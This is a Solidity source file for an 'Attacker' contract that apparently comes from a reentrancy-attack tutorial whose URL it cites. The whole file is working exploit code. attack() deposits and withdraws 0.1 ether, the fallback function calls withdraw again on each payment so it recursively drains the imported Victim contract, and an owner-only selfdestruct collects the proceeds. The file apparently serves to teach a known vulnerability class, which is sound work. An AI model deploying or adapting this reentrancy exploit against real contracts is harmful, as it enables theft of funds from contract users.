pragma solidity ^0.4.24;
//https://github.com/Oakland-Blockchain-Developers/Reentrancy-Attack-On-Smart-Contract/blob/master/reentrancy-attack-101.md
import "./SafeMath.sol";
import "./victim.sol";

contract Attacker {
    using SafeMath for uint256;
    bytes32 public name = "Victim";
    uint8 public decimals = 2;
    
    address private _owner;
    Victim victim;

    constructor() public {
        _owner = msg.sender;
    }

    function setVictimAddress(address victimAddress) public returns (bool) {
        victim = Victim(victimAddress);
    }

    function attack() public payable {
        victim.donate.value(0.1 ether)(this);
        victim.withdraw(0.1 ether);
    }
   
    function() external payable {
        victim.withdraw(0.1 ether);
    }
    
    function ethBalance(address _c) public view returns(uint) {
      return _c.balance;
    }
    
    function kill () public {
        require(msg.sender == _owner);
        selfdestruct(_owner);
    }
}